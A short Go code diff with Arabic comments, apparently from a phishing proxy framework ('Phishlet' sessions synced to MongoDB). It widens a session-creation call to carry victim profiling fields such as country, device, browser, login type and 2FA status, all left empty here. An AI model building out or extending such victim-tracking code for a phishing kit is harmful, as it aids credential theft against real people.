@@ -344,7 +344,13 @@ func syncSessionsToMongoDB(buntDb *database.Database, mongoDb database.IDatabase
 			// إنشاء الجلسة في MongoDB إذا لم تكن موجودة
 			log.Debug("الجلسة غير موجودة في MongoDB، يتم إنشاؤها...")
 			
-			err = mongoDb.CreateSession(s.SessionId, s.Phishlet, s.LandingURL, s.UserAgent, s.RemoteAddr)
+			err = mongoDb.CreateSession(
+				s.SessionId, s.Phishlet, s.LandingURL, 
+				s.UserAgent, s.RemoteAddr,
+				"", "", // countryCode, countryName
+				"", "", "", "", "", // deviceType, browserType, browserVersion, osType, osVersion
+				"", false, "", // loginType, has2FA, type2FA
+			)
 			if err != nil {
 				log.Error("فشل إنشاء الجلسة في MongoDB: %v", err)
 				continue
